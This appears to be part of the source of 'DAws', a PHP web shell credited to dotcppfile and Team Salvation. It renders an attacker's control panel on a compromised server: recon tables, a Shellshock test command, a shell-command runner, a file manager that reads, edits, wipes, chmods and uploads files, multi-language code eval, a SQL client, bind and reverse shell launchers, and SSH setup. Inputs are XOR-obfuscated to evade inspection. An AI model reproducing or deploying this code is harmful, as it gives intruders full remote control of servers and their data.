if ($_SESSION["windows"] == True) { //causing the shell to load slowly because of the command itself but it's worth it
	$total_amount = execute_command("wmic memorychip get capacity");
	$total_amount = explode("\n", $total_amount);
	unset($total_amount[0]);
	$total_memory = 0;
	foreach ($total_amount as $amount) {
		$total_memory += $amount;
	}
	$total_memory /= 1073741824;

	echo "
	<tr>
		<td>Total RAM</td>
		<td>$total_memory GB</td>
	</tr>";
} else {
	$total_memory = execute_command("free -mt | grep Mem | awk '{print \$2}'");
	if ($total_memory != null) {
		echo "
		<tr>
			<td>Total RAM</td>
			<td>".($total_memory/1024)." GB</td>
		</tr>";
	}
}

echo "
	<tr>
		<td>Your IP</td>
		<td>".$_SERVER['REMOTE_ADDR']."</td>
	</tr>
	<tr>
		<td>Encryption Key</td>
		<td>".$_SESSION["key"]."</td>
	</tr>
	<tr>
		<td>DAws's Directory</td>
		<td>".$_SESSION["daws_directory"]."</td>
	</tr>
	<tr>
		<td>CGI</td>
		<td>";
		if ($_SESSION["cgi"]) {
			echo "True</td>";
		} else {
			echo "False</td>";
		}
echo "
	</tr>
	<tr>
		<td>CGI Shell</td>
		<td>".$_SESSION["cgi_url"]."</td>
	</tr>
	<tr>
		<td>Shellshock threw DAws</td>
		<td>";
		if ($_SESSION["shsh"]) {
			echo "True</td>";
		} else {
			echo "False</td>";
		}
echo "
	</tr>
	<tr>
		<td>Shellshock</td>
		<td>";
		if (execute_command("env x='() { :;}; echo dotcppfile' bash -c \"echo dotcppfile\"") == "dotcppfile\ndotcppfile\n") {
			echo "True</td>";
		} else {
			echo "False</td>";
		}
echo "
	</tr>
	<tr>
		<td>SSH Method</td>
		<td>";

		if ((isset($_SESSION["ssh"])) && ($_SESSION["ssh"] == True)) {
			echo "True</td>";
		} else {
			echo "False</td>";
		}
echo "
	</tr>
</table>
</div>

<div class='right'>
<table class='flat-table' style='table-layout: fixed;'>
	<caption>
		<form style='display:inline;' action='#File Manager' method='post'>
			<input type='hidden' name='dir' value='".xor_this($_SESSION["daws_directory"])."' />
			<input type='submit' value=\"DAws's directory\" class='a_button'/>
		</form>
	</caption>
	<tr>
		<th style='width: 20%;'>Type</th>
		<th>Name</th>
	</tr>";


if ($handle = opendir($_SESSION["daws_directory"])) {
	$rows = array();
	$pos = strrpos($_SESSION["daws_directory"], "/");
	$topdir = substr($_SESSION["daws_directory"], 0, $pos + 1);
	$i = 0;
	while (false !== ($file = readdir($handle))) {
		if ($file != "." && $file != "..") {
			$rows[$i]['data'] = $file;
			$rows[$i]['dir'] = is_dir($_SESSION["daws_directory"] . "/" . $file);
			$i++;
		}
	}
	closedir($handle);

	$size = count($rows);

	if ($size != 0) {
		$rows = sortRows($rows);

		for ($i = 0; $i < $size; ++$i) {
			$curr_dir = $_SESSION["daws_directory"] . "/" . $rows[$i]['data'];
			echo "<tr><td>";
			if ($rows[$i]['dir']) {
				echo "[DIR]";
			} else {
				echo "[FILE]";
			}

			echo "</td>";

			if (is_readable($curr_dir)) {
				echo "
				<td>
					<form style='font-color=;display:inline;' action='#File Manager' method='post'>
						<input type='hidden' name='dir' value='".xor_this($curr_dir)."' />
						<input type='hidden' name='old_dir' value='".xor_this($_SESSION["daws_directory"])."' />
						<input type='submit' value='".$rows[$i]['data']."' class='a_button' />
					</form>
				</td>";
			} else {
				echo "<td>".$rows[$i]['data']."</td>";
			}
		}
	}
}

echo "
</table>
</div>

<div class='center' id='center'>
<center>

<h1><a href=".$_SERVER['PHP_SELF'].">DAws</a> 5/12/2015</h1>

Coded by <a href=\"https://twitter.com/dotcppfile\">dotcppfile</a> and Team Salvation

<h3><A NAME='Commander' href='#Commander'>Commander</A></h3>

<p class='danger'>Using full paths in your commands is suggested.</p>

<table class='flat-table' style='table-layout:fixed; word-wrap:break-word;'>
	<tr>
		<td style='width: 20%;'>disabled php</td>
		<td style='word-wrap:break-word;'>".implode(",", $GLOBALS["disabled_php"])."</td>
	</tr>
	<tr>
		<td style='width: 20%;'>disabled suhosin</td>
		<td style='word-wrap:break-word;'>".implode(",", $GLOBALS["disabled_suhosin"])."</td>
	</tr>
	<form style='display:inline;' action='#Commander' method='post' onsubmit=\"xorencr(['command'])\">
	<tr>
		<td style='height:50px;' colspan='2'>Command:
			<input type='text' size='40%' name='command' id='command'/>
			<input type='hidden' name='dir' value='".xor_this($dir)."'/>
			<input type='submit' value='Execute'/>
		</td>
	</tr>";

if (isset($GLOBALS["command"])) {
	echo "
	<tr>
		<td style='text-align:left; padding:1%;' colspan='2'>".$GLOBALS["command"]."</td>
	</tr>";
}

echo "
	</form>
</table>


<h3><A NAME='File Manager' href='#File Manager'>File Manager</A></h3>

<p class='danger'>Uploading and Zipping functions ouputs in DAws's directory.</p>";

if (file_exists($dir) && (is_readable($dir))) {
	if (is_dir($dir)) {
		echo "
		<table class='flat-table' style='height: 100px;'>
			<tr>
				<td>Shell's Directory:
					<form style='display:inline;' action='#File Manager' method='post'>
						<input type='hidden' name='dir' value='".xor_this(getcwd())."' />
						<input type='submit' value='".getcwd()."' class='a_button' />
					</form>
				</td>
			</tr>
			<tr>
				<td>Current Directory: $dir</td>
			</tr>
			<tr>
				<td>Change Directory/Read File:
				<form action='#File Manager' method='post' onsubmit=\"xorencr(['dir'])\" style='display:inline'>
					<input style='width:250px' name='dir' id='dir' type='text' value='$dir'/>
					<input name='old_dir' id='old_dir' type='hidden' value='".xor_this($dir)."'/>
					<input type='submit' value='Change' name='Change'/>
				</form>
				</td>
			</tr>
		</table>";

		if ($handle = opendir($dir)) {
			$rows = array();
			$pos = strrpos($dir, "/");
			$topdir = substr($dir, 0, $pos + 1);
			$i = 0;
			while (false !== ($file = readdir($handle))) {
				if ($file != "." && $file != "..") {
					$rows[$i]['data'] = $file;
					$rows[$i]['dir'] = is_dir($dir . "/" . $file);
					$i++;
				}
			}
			closedir($handle);

			$size = count($rows);

			echo "
			<table class='flat-table'>
				<tr>
					<th>Type</th>
					<th>Name</th>
					<th>Size (bytes)</th>
					<th>File Owner</th>
					<th>File Group</th>
					<th>Permissions</th>
					<th>Actions</th>
				</tr>

				<tr>
					<td>[UP]</td>
					<td>
						<form style='display:inline;' action='#File Manager' method='post'>
							<input type='hidden' name='dir' value='".xor_this($topdir)."' />
							<input type='hidden' name='old_dir' value='".xor_this($dir)."'/>
							<input type='submit' value='..' class='a_button' />
						</form>
					</td>
					<td></td>
					<td></td>
					<td></td>
					<td></td>
					<td></td>
				</tr>";

			if ($size != 0) {
				$rows = sortRows($rows);

				for ($i = 0; $i < $size; ++$i) {
					$curr_dir = $dir . "/" . $rows[$i]['data'];
					echo "<tr><td>";
					if ($rows[$i]['dir']) {
						echo "[DIR]";
					} else if (is_link($curr_dir) == False) {
						echo "[FILE]";
					} else {
						echo "[LINK]";
					}
					echo "</td>";

					if (is_readable($curr_dir)) {					
						if (is_link($curr_dir)) {
							$rows[$i]['data'] .= " -> ".readlink($curr_dir);	
						}

						echo "
						<td>
							<form style='font-color=;display:inline;' action='#File Manager' method='post'>
								<input type='hidden' name='dir' value='".xor_this($curr_dir)."' />
								<input type='hidden' name='old_dir' value='".xor_this($dir)."' />
								<input type='submit' value='".$rows[$i]['data']."' class='a_button' />
							</form>
						</td>";
					} else {
						echo "<td>".$rows[$i]['data']."</td>";
					}

					if (is_executable($dir)) {
						echo "<td>".@filesize($curr_dir)."</td>";
					} else {
						echo "<td></td>";
					}

					$fileowner = "";
					$filegroup = "";
					if ((is_executable($dir)) && (installed_php("fileowner")) && (installed_php("filegroup"))) {
						$fileowner = @fileowner($curr_dir);
						$filegroup = @filegroup($curr_dir);

						if (installed_php("posix_getpwuid")) {
							$fileowner = @posix_getpwuid($fileowner);
							$fileowner = $fileowner["name"]; //don't blame me for this, blame old versions of php...
							$filegroup = @posix_getgrgid($filegroup);
							$filegroup = $filegroup["name"];
						}
					}
					echo "<td>$fileowner</td>";
					echo "<td>$filegroup</td>";

					if (is_executable($dir)) {
						echo "<td>".@get_permissions($curr_dir)."</td>";
					} else {
						echo "<td></td>";
					}

					echo "<td>";
					if (is_dir($curr_dir)) { //for directories only
						if (is_readable($curr_dir)) {
							echo "
							<form style='font-color=;display:inline;' action='#File Manager' method='post'>
								<input type='hidden' name='zip' value='".xor_this($curr_dir)."'/>
								<input type='hidden' name='dir' value='".xor_this($dir)."' />
								<input type='submit' class='a_button' value='Zip'/>
							</form>";
						}
					} else { //for files only
						if (is_readable($curr_dir)) {
							echo "
							<form style='font-color=;display:inline;' action='#File Manager' method='post'>
								<input type='hidden' name='download' value='".xor_this($curr_dir)."'/>
								<input type='submit' class='a_button' value='Download'/>
							</form>";
						}

						if ((is_readable($curr_dir)) && (is_writable($curr_dir))) {
							echo "
							<form style='font-color=;display:inline;' action='#File Manager' method='post'>
								<input type='hidden' name='dir' value='".xor_this($curr_dir)."' />
								<input type='hidden' name='old_dir' value='".xor_this($dir)."' />
								<input type='submit' class='a_button' value='Edit'/>
							</form>";
							
							echo "
							<form style='font-color=;display:inline;' action='#File Manager' method='post'>
								<input type='hidden' name='wipe' value='".xor_this($curr_dir)."'/>
								<input type='hidden' name='dir' value='".xor_this($dir)."' />
								<input type='submit' class='a_button' value='Wipe'/>
							</form>";
						}
					}
					
					if ((is_readable($dir)) && (is_writable($dir)) && (is_executable($dir))) {
						echo "
						<input type='button' class='a_button' value='Rename' onclick=\"show_div('rename-".xor_this($curr_dir)."')\"/>

						<div id='rename-".xor_this($curr_dir)."' style='display:none;'>
							<form action='#File Manager' method='post' onsubmit=\"xorencr(['new_name-".xor_this($curr_dir)."'])\">
								<input style='width:150px' name='new_name' id='new_name-".xor_this($curr_dir)."' type='text' value=''/>
								<input type='hidden' name='old_name' value='".xor_this($curr_dir)."'/>
								<input type='hidden' name='dir' value='".xor_this($dir)."' />
								<input type='submit' value='Rename'/>
							</form>
						</div>";


						echo "
						<form style='font-color=;display:inline;' action='#File Manager' method='post'>
							<input type='hidden' name='del' value='".xor_this($curr_dir)."'/>
							<input type='hidden' name='dir' value='".xor_this($dir)."' />
							<input type='submit' class='a_button' value='Del'/>
						</form>";
					}
					
					if ($_SESSION["process_owner"] == $fileowner) { //can we chmod?
						echo "
							<input type='button' class='a_button' value='Chmod' onclick=\"show_div('chmod-".xor_this($curr_dir)."')\"/>

							<div id='chmod-".xor_this($curr_dir)."' style='display:none;'>
								<form action='#File Manager' method='post' onsubmit=\"xorencr(['new_chmod-".xor_this($curr_dir)."'])\">
									<input style='width:150px' name='new_chmod' id='new_chmod-".xor_this($curr_dir)."' type='text' value='' placeholder='Example: 666'/>
									<input type='hidden' name='file_name' value='".xor_this($curr_dir)."' />
									<input type='hidden' name='dir' value='".xor_this($dir)."' />
									<input type='submit' value='Chmod'/>
								</form>
							</div>";
					}
					
					echo "</td></tr>";
				}
			}

			echo "
			</table>
			<table class='flat-table' style='height: 100px;'>
				<tr>
					<form action='#File Manager' method='post' enctype='multipart/form-data'>
						<td>Upload File(s) (Browse):</td>
						<td><input type='file' value='Browse' name='file_upload[]' multiple/></td>
						<input type='hidden' name='dir' value='".xor_this($dir)."'/>
						<td><input type='submit' value='Upload'/></td>
					</form>
				</tr>
				<tr>
					<form action='#File Manager' method='post' onsubmit=\"xorencr(['link_download'])\">
						<td>Upload File (Link):</td>
						<td><input placeholder='Direct Links required!' style='width:80%' id='link_download' name='link_download' type='text'/></td>
						<input type='hidden' name='dir' value='".xor_this($dir)."'/>
						<td><input type='submit' value='Upload'/></td>
					</form>
				</tr>";

				if (is_writable($dir)) {
					echo "
					<tr>
						<form action='#File Manager' method='post' onsubmit=\"xorencr(['mkfile'])\">
							<td>Create File:</td>
							<td><input style='width:80%' id='mkfile' name='mkfile' type='text'/></td>
							<input type='hidden' name='dir' value='".xor_this($dir)."'/>
							<td><input type='submit' value='Create'/></td>
						</form>
					</tr>
					<tr>
						<form action='#File Manager' method='post' onsubmit=\"xorencr(['mkdir'])\">
							<td>Create Folder:</td>
							<td><input style='width:80%' id='mkdir' name='mkdir' type='text'/></td>
							<input type='hidden' name='dir' value='".xor_this($dir)."'/>
							<td><input type='submit' value='Create'/></td>
						</form>
					</tr>";
				}

			echo "</table>";
		}
	} else {
		$content = read_file($dir);

		echo "
		<br/>
		<form action='#File Manager' method='post'>
			<input type='hidden' name='dir' value='".$_POST["old_dir"]."' />
			<input type='submit' value='Go Back' class='a_button' />
		</form>";

		if (is_writable($dir)) {
			echo "
			<table class='flat-table' style='table-layout: fixed;'>
				<tr>
					<form action='#File Manager' method='post' onsubmit=\"xorencr(['edit'])\">
						<td style='padding:1%;'>
							<textarea id='edit' name='edit'>$content</textarea><br/>
							<input type='hidden' name='location' value='".xor_this($dir)."'/>
							<input type='hidden' name='old_dir' value='".$_POST["old_dir"]."' />
							<input type='submit' value='Edit'/>
						</td>
					</form>
				</tr>
			</table>";
		} else {
			echo "
			<table class='flat-table' style='table-layout: fixed;'>
				<tr>
					<td><textarea name='edit'>$content</textarea></td>
				</tr>
			</table>";
		}
	}
} else {
	echo "
	<form action='#File Manager' method='post'>
		<input type='hidden' name='dir' value='".$_POST["old_dir"]."' />
		<input type='submit' value='Go Back' class='a_button' />
	</form>
	<p class='danger'>`$dir` is not read readable or doesn't exist!</p>";
}

echo "
<h3><A NAME='Eval' href='#Eval'>Eval</A></h3>

<p class='danger'>DO NOT include '&lt;?php' at the beginning or '?&gt;' at the end for Php.</p>

<table class='flat-table' style='table-layout: fixed;'>
	<tr>
		<form action='#Eval 'method='post' onsubmit=\"xorencr(['eval_code'])\">
			<td style='padding:1%;'>
				<input type='hidden' name='dir' value='".xor_this($dir)."' />
				<textarea name='eval_code' id='eval_code'></textarea><br/>
				<input type='submit' value='Execute'/>
				<select name='eval_lang'>
					<option value='".xor_this("Php")."'>Php</option>";
if ($_SESSION["perl"] != null) {
	echo "<option value='".xor_this("Perl")."'>Perl</option>";
}
if ($_SESSION["python"] != null) {
	echo "<option value='".xor_this("Python")."'>Python</option>";
}
if ($_SESSION["ruby"] != null) {
	echo "<option value='".xor_this("Ruby")."'>Ruby</option>";
}
echo "
				</select>
				<input name='output_needed' type='checkbox'/>Show Output
			</td>
		</form>
	</tr>";

if (isset($_POST["eval_code"])) {
	$eval_code = unxor_this($_POST["eval_code"]);
	$eval_lang = unxor_this($_POST["eval_lang"]);

	if (isset($_POST["output_needed"])) {
		$output_needed = True;
	} else {
		$output_needed = False;
	}

	echo "<tr><td>";
	if ($eval_lang == "Php") {
		execute_php($eval_code, $output_needed);
	} else if ($eval_lang == "Perl") {
		echo execute_script($eval_code, $_SESSION["perl"], "pl", $output_needed);
	} else if ($eval_lang == "Python") {
		echo execute_script($eval_code, $_SESSION["python"], "py", $output_needed);
	} else if ($eval_lang == "Ruby") {
		echo execute_script($eval_code, $_SESSION["ruby"], "rb", $output_needed);
	}
	echo "</td></tr>";
}

echo "
</table>

<h3><A NAME='Sql Connect' href='#Sql Connect'>Sql Connect</A></h3>

<table class='flat-table' style='table-layout: fixed;'>

	<form action='#Sql Connect 'method='post' onsubmit=\"xorencr(['sql_host', 'sql_user', 'sql_pass', 'sql_database'])\">
		<tr>
			<td style='padding:1%;'>
				Connection:
				<input placeholder='Sql Host' type='text' name='sql_host' id='sql_host' style='width:15%;'/>
				<input placeholder='Sql User' type='text' name='sql_user' id='sql_user' style='width:15%;'/>
				<input placeholder='Sql Password' type='text' name='sql_pass' id='sql_pass' style='width:15%;'/>
				<input placeholder='Sql Database' type='text' name='sql_database' id='sql_database' style='width:15%;'/>
				<input type='hidden' name='dir' value='".xor_this($dir)."' />
				<input type='submit' value='Connect'/>
			</td>
		</tr>
	</form>";

if ((isset($_SESSION["mysqli"])) && ($_SESSION["mysqli"] == True)) {
	echo "
	<form action='#Sql Connect' method='post' onsubmit=\"xorencr(['sql_execute'])\">
		<tr>
			<td style='padding:1%;'>
				Query: <input type='text' style='width:40%;' name='sql_execute' id='sql_execute'/>
				<input type='hidden' name='dir' value='".xor_this($dir)."' />
				<input type='submit' value='Execute'/>
				<input type='checkbox' name='save_output' value='Save Output'/>Save Output
			</td>
		</tr>
	</form>";
}

if (isset($GLOBALS["sql_output"])) {
	echo "
	<tr>
		<td style='padding:1%;'><textarea>".$GLOBALS["sql_output"]."</textarea></td>
	</tr>";
}

echo "
</table>

<h3><A NAME='Bind Shells' href='#Bind Shells'>Bind Shells</A></h3>

<table class='flat-table' style='table-layout: fixed;'>
<form method='post' action='#Bind Shells' onsubmit=\"xorencr(['bind_port'])\">
	<tr>
		<td style='padding: 1%'>
			Info:
			<input name='bind_port' id='bind_port' placeholder='Port' type='text'/>
			<select name='bs_lang'>";
if ($_SESSION["perl"] != null) {
	echo "<option value='".xor_this("Perl")."'>Perl</option>";
}
if ($_SESSION["python"] != null) {
	echo "<option value='".xor_this("Python")."'>Python</option>";
}
if ($_SESSION["ruby"] != null) {
	echo "<option value='".xor_this("Ruby")."'>Ruby</option>";
}
if (($_SESSION["windows"] == False) && (execute_command("nc", True))) {
	echo "<option value='".xor_this("Netcat")."'>Netcat</option>";
}
echo "
				</select>
			<input	type='submit' value='Bind'/>
			<input	type='checkbox' name='background'/>Run in background
		</td>
	</tr>
</form>
</table>

<h3><A NAME='Reverse Shells' href='#Reverse Shells'>Reverse Shells</A></h3>

<table class='flat-table' style='table-layout: fixed;'>
<form method='post' action='#Bind Shells' onsubmit=\"xorencr(['reverse_ip', 'reverse_port'])\">
	<tr>
		<td style='padding: 1%'>
			Info:
			<input name='reverse_ip' id='reverse_ip' placeholder='IP Address' type='text'/>
			<input name='reverse_port' id='reverse_port' placeholder='Port' type='text'/>
			<select name='rs_lang'>";
if ($_SESSION["perl"] != null) {
	echo "<option value='".xor_this("Perl")."'>Perl</option>";
}
if ($_SESSION["python"] != null) {
	echo "<option value='".xor_this("Python")."'>Python</option>";
}
if ($_SESSION["ruby"] != null) {
	echo "<option value='".xor_this("Ruby")."'>Ruby</option>";
}
if ($_SESSION["windows"] == False) {
	echo "<option value='".xor_this("Bash")."'>Bash</option>";
}
echo "
				</select>
			<input	type='submit' value='Bind'/>
			<input	type='checkbox' name='background'/>Run in background
		</td>
	</tr>
</form>
</table>";

if ($_SESSION["windows"] == False) { //linux only for now
	echo "
	<h3><A NAME='Setup SSH' href='#Setup SSH'>Setup SSH</A></h3>

	<p class='danger'>Make sure you upload all the files in 'https://github.com/dotcppfile/DAws/tree/master/phpseclib%20-%20DAws', using the File Manager, first.</p>

	<table class='flat-table' style='table-layout: fixed;'>
	<form method='post' action='#Setup SSH' onsubmit=\"xorencr(['ssh_user', 'ssh_port', 'home_dir'])\">
		<tr>
			<td style='padding: 1%'>
				Info:
				<input name='ssh_user' id='ssh_user' placeholder='SSH Username' type='text'/>
				<input name='ssh_port' id='ssh_port' placeholder='SSH Port' type='text'/>
				<input name='home_dir' id='home_dir' placeholder='Home Directory' type='text'/>
				<input	type='submit' value='Go'/>
			</td>
		</tr>
	</form>
	</table>";
}

echo "
</center>
</div>

</body>
</html>";
?>
